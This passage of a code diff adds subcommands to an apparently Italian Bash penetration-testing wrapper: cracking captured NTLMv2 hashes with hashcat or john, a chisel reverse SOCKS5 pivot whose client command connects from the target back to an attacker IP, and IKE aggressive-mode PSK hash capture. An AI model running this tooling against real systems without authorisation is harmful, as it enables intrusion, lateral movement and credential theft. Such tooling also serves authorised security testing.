+                    "hashcat -m 5600 '$combined_hashes' '$wl' \
+                     --outfile '$OUTDIR/cracked_ntlmv2.txt' \
+                     --outfile-format 2 -O --status --status-timer 10 \
+                     2>&1 | tail -20 || true"
+                if [[ -s "$OUTDIR/cracked_ntlmv2.txt" ]]; then
+                    while IFS= read -r line; do
+                        found CRITICAL "HASH CRACKED — $line"
+                    done < "$OUTDIR/cracked_ntlmv2.txt"
+                fi
+            elif command -v john &>/dev/null; then
+                log "Crack con john (fallback CPU)..."
+                run_cmd "john_ntlmv2" \
+                    "john --wordlist='$wl' --format=netntlmv2 '$combined_hashes' \
+                     2>&1 | tee '$OUTDIR/john_crack.log' || true"
+                run_cmd "john_show" \
+                    "john --show --format=netntlmv2 '$combined_hashes' \
+                     2>&1 | tee '$OUTDIR/john_cracked.txt'"
+                if [[ -s "$OUTDIR/john_cracked.txt" ]]; then
+                    grep -v "^0 password" "$OUTDIR/john_cracked.txt" 2>/dev/null | \
+                        while IFS= read -r line; do
+                            found CRITICAL "HASH CRACKED (john) — $line"
+                        done || true
+                fi
+            else
+                warn "Né hashcat né john trovati — crack saltato. File hash: $combined_hashes"
+            fi
+        fi
+    else
+        log "Nessun hash NTLMv2 catturato in questa sessione"
+    fi
+
+    ok "Poisoning completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: pivot — HTTP tunneling e SOCKS5 proxy (chisel)
+# ============================================================
+usage_pivot() {
+    echo "Uso: exa-dune pivot <TARGET> [OPTIONS]"
+    echo ""
+    echo "  Pivoting via HTTP tunnel e SOCKS5 proxy con chisel"
+    echo "  Wraps: chisel, proxychains"
+    echo ""
+    echo "  Modalità server: avvia chisel server locale per connessioni reverse"
+    echo "  Modalità client: mostra comando da eseguire sul target"
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT        Porta chisel server (default: 8888)"
+    echo "  --socks-port PORT  Porta SOCKS5 locale (default: 1080)"
+    echo "  --server           Avvia solo il server chisel (non avviato di default)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_pivot() {
+    local target="" chisel_port=8888 socks_port=1080 do_server=0
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)       _req_arg "$1" "${2:-}"; chisel_port="$2"; shift 2 ;;
+            --socks-port) _req_arg "$1" "${2:-}"; socks_port="$2";  shift 2 ;;
+            --server)     do_server=1; shift ;;
+            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)    DRY_RUN=1; shift ;;
+            --help|-h)    usage_pivot; exit 0 ;;
+            -*)           err "Opzione sconosciuta: $1"; usage_pivot; exit 1 ;;
+            *)            target="$1"; shift ;;
+        esac
+    done
+
+    local _ptarget="${target:-local_pivot}"
+    setup_outdir "$_ptarget" "pivot"
+    log "Pivot setup | Chisel port: $chisel_port | SOCKS5: $socks_port | Output: $OUTDIR"
+
+    if ! command -v chisel &>/dev/null; then
+        warn "chisel non trovato — scarica da: https://github.com/jpillora/chisel/releases"
+        warn "  oppure: go install github.com/jpillora/chisel@latest"
+        [[ $DRY_RUN -eq 1 ]] || return 0
+    fi
+
+    local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "ATTACKER_IP")
+
+    section "Chisel Pivot Setup"
+
+    # Genera configurazione proxychains
+    local proxychains_conf="$OUTDIR/proxychains_pivot.conf"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        cat > "$proxychains_conf" << PROX_EOF
+# proxychains config generato da exa-dune pivot
+# Usa: proxychains4 -f $proxychains_conf <comando>
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 $socks_port
+PROX_EOF
+        ok "proxychains config → $proxychains_conf"
+    fi
+
+    log "Comando server chisel (da eseguire su attaccante):"
+    log "  chisel server -p $chisel_port --reverse --socks5"
+
+    if [[ $do_server -eq 1 && $DRY_RUN -eq 0 ]]; then
+        run_cmd "chisel_server" \
+            "chisel server -p $chisel_port --reverse --socks5 \
+             2>&1 | tee '$OUTDIR/chisel_server.log' &"
+        log "Chisel server avviato in background su :$chisel_port"
+    else
+        echo -e "${CYAN}[SERVER]${NC} chisel server -p $chisel_port --reverse --socks5"
+    fi
+
+    if [[ -n "$target" ]]; then
+        log ""
+        log "Comando client da eseguire SUL TARGET ($target):"
+        log "  chisel client ${attacker_ip}:${chisel_port} R:${socks_port}:socks"
+        log ""
+        log "Dopo la connessione del client, usa proxychains:"
+        log "  proxychains4 -f $proxychains_conf nmap -sT -Pn $target"
+        log "  proxychains4 -f $proxychains_conf curl http://192.168.x.x/"
+
+        if [[ $DRY_RUN -eq 0 ]]; then
+            {
+                echo "# Chisel pivot setup — $(date)"
+                echo "# Target: $target"
+                echo "Server: chisel server -p $chisel_port --reverse --socks5"
+                echo "Client (sul target): chisel client ${attacker_ip}:${chisel_port} R:${socks_port}:socks"
+                echo "SOCKS5: 127.0.0.1:$socks_port"
+                echo "proxychains config: $proxychains_conf"
+            } > "$OUTDIR/pivot_setup.txt"
+        fi
+    fi
+
+    found MEDIUM "PIVOT — Chisel tunnel configurato: ${attacker_ip}:${chisel_port} → SOCKS5 127.0.0.1:${socks_port}"
+    ok "Pivot setup completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: vpn — IPsec/IKE VPN enumeration (ike-scan)
+# ============================================================
+usage_vpn() {
+    echo "Uso: exa-dune vpn <TARGET> [OPTIONS]"
+    echo ""
+    echo "  IPsec/IKE VPN enumeration e PSK hash capture"
+    echo "  Wraps: ike-scan"
+    echo ""
+    echo "Opzioni:"
+    echo "  --aggressive       Usa IKE aggressive mode (PSK crack)"
+    echo "  --psk-crack FILE   File output per PSK hash crack"
+    echo "  --port PORT        Porta IKE (default: 500)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_vpn() {
+    local target="" do_aggressive=0 psk_file="" port=500
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --aggressive) do_aggressive=1; shift ;;
+            --psk-crack)  _req_arg "$1" "${2:-}"; psk_file="$2"; shift 2 ;;
+            --port)       _req_arg "$1" "${2:-}"; port="$2";     shift 2 ;;
+            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)    DRY_RUN=1; shift ;;
+            --help|-h)    usage_vpn; exit 0 ;;
+            -*)           err "Opzione sconosciuta: $1"; usage_vpn; exit 1 ;;
+            *)            target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_vpn; exit 1; }
+    validate_target "$target"
+    setup_outdir "$target" "vpn"
+    log "Target: $target:$port | Output: $OUTDIR"
+    [[ $DRY_RUN -eq 1 ]] && return
+
+    if ! command -v ike-scan &>/dev/null; then
+        warn "ike-scan non trovato — installa: apt install ike-scan"
+        return 0
+    fi
+
+    psk_file="${psk_file:-$OUTDIR/ike_psk_hashes.txt}"
+
+    section "IKE Detection (UDP/500)"
+    run_cmd "ike_scan" \
+        "ike-scan $target 2>&1 | tee '$OUTDIR/ike_scan.txt'"
+    if [[ -f "$OUTDIR/ike_scan.txt" ]]; then
+        if grep -qiE "Main Mode|Aggressive Mode|ISAKMP" "$OUTDIR/ike_scan.txt" 2>/dev/null; then
+            found HIGH "VPN:$port — IKE ISAKMP risponde (IPsec VPN attivo)"
+            local ike_version; ike_version=$(grep -oiE "IKEv[12]" "$OUTDIR/ike_scan.txt" | head -1 || echo "IKE")
+            local ike_enc; ike_enc=$(grep -oiE "Enc=\S+" "$OUTDIR/ike_scan.txt" | head -1 || true)
+            local ike_hash; ike_hash=$(grep -oiE "Hash=\S+" "$OUTDIR/ike_scan.txt" | head -1 || true)
+            [[ -n "$ike_enc" ]] && found INFO "VPN — Cifratura: $ike_enc $ike_hash"
+        fi
+    fi
+
+    if [[ $do_aggressive -eq 1 ]]; then
+        section "IKE Aggressive Mode (PSK hash capture)"
+        run_cmd "ike_aggressive" \
+            "ike-scan --aggressive --id=exa-dune-test \
+             --pskcrack='$psk_file' $target \
+             2>&1 | tee '$OUTDIR/ike_aggressive.txt' || true"
+        if [[ -s "$psk_file" ]]; then
+            found CRITICAL "VPN — PSK hash catturato in aggressive mode → $psk_file"
+            log "Crack offline: hashcat -m 5300 '$psk_file' <wordlist>"
+        fi
+    fi
+
+    section "Nmap IKE/VPN NSE"
+    run_cmd "nmap_ike" \
+        "nmap -sU -p $port --script ike-version \
+         -oN '$OUTDIR/nmap_ike.txt' $target 2>&1 || true"
+    if [[ -f "$OUTDIR/nmap_ike.txt" ]]; then
+        grep -qiE "ike-version" "$OUTDIR/nmap_ike.txt" 2>/dev/null && \
+            found MEDIUM "VPN:$port — nmap ike-version: $(grep -A2 'ike-version' "$OUTDIR/nmap_ike.txt" 2>/dev/null | tail -1 || true)"
+    fi
+
+    ok "VPN/IKE audit completato → $OUTDIR"
+}
+
+# ============================================================
 #  HELP
 # ============================================================
 cmd_help() {
@@ -13706,6 +14479,11 @@ cmd_help() {
         voip-enum)     banner; usage_voip_enum     ;;
         config-audit)  banner; usage_config_audit  ;;
         history)       banner; usage_history       ;;
+        nuclei)        banner; usage_nuclei        ;;
+        mitm)          banner; usage_mitm          ;;
+        poison)        banner; usage_poison        ;;
+        pivot)         banner; usage_pivot         ;;
+        vpn)           banner; usage_vpn           ;;
         *)
             banner
             echo -e "${BOLD}Uso:${NC}  exa-dune <subcommand> <TARGET> [OPTIONS]"
@@ -13763,6 +14541,11 @@ cmd_help() {
             printf "  %-15s %s\n" "voip-enum"     "Enum VoIP avanzato: rate limit, user enum, toll fraud"
             printf "  %-15s %s\n" "config-audit"  "Audit file di configurazione: credenziali, SNMP, TLS"
             printf "  %-15s %s\n" "history"       "Storico assessment da database SQLite"
+            printf "  %-15s %s\n" "nuclei"        "Nuclei CVE/template scanner  (IoT, CVEs, panels, logins)"
+            printf "  %-15s %s\n" "mitm"          "MITM framework               (bettercap: ARP, sniff, BLE)"
+            printf "  %-15s %s\n" "poison"        "LLMNR/MDNS poisoning + crack (responder, hashcat/john)"
+            printf "  %-15s %s\n" "pivot"         "HTTP tunnel + SOCKS5 proxy   (chisel)"
+            printf "  %-15s %s\n" "vpn"           "IPsec/IKE VPN enumeration    (ike-scan, PSK capture)"
             echo ""
             echo -e "${BOLD}Esempi:${NC}"
             echo "  exa-dune scan 192.168.1.1 --stealth"
@@ -13787,6 +14570,11 @@ cmd_help() {
             echo "  exa-dune history --target 192.168.1.1"
             echo "  exa-dune self-test"
             echo "  exa-dune self-test --install-missing"
+            echo "  exa-dune nuclei 192.168.1.1 --port 80"
+            echo "  exa-dune mitm --iface eth0 --target 192.168.1.1 --gateway 192.168.1.254"
+            echo "  exa-dune poison --iface eth0 --duration 120"
+            echo "  exa-dune pivot --mode server --port 9090"
+            echo "  exa-dune vpn 192.168.1.1"
             echo ""
             echo -e "${BOLD}Flag globali (validi per tutti i subcommand):${NC}"
             echo "  --output DIR       Directory output (default: auto-generata)"
@@ -13929,12 +14717,25 @@ cmd_install() {
         "sipsak:sipsak"
         "rtmpdump:rtmpdump"
         "avahi-browse:avahi-utils"
+        "bettercap:bettercap"
+        "responder:responder"
+        "ike-scan:ike-scan"
+        "masscan:masscan"
+        "hashcat:hashcat"
+        "john:john"
+        "binwalk:binwalk"
+        "hping3:hping3"
+        "netexec:netexec"
+        "voiphopper:voiphopper"
+        "nxc:netexec"
     )
 
     # ── Pacchetti pip3 (fallback se apt non disponibile) ──────────────────────
     local PIP_TOOLS=(
         "weasyprint:weasyprint"
         "svmap:sipvicious"
+        "wafw00f:wafw00f"
+        "sippts:sippts"
     )
 
     echo -e "${BOLD}[1/3] Controllo tool apt...${NC}"
@@ -16908,6 +17709,11 @@ case "$subcommand" in
     voip-enum)      cmd_voip_enum     "$@" ;;
     config-audit)   cmd_config_audit  "$@" ;;
     history)        cmd_history       "$@" ;;
+    nuclei)         cmd_nuclei        "$@" ;;
+    mitm)           cmd_mitm          "$@" ;;
+    poison)         cmd_poison        "$@" ;;
+    pivot)          cmd_pivot         "$@" ;;
+    vpn)            cmd_vpn           "$@" ;;
     printer)        cmd_printer        "$@" ;;
     amqp)           cmd_amqp           "$@" ;;
     log4shell)      cmd_log4shell      "$@" ;;
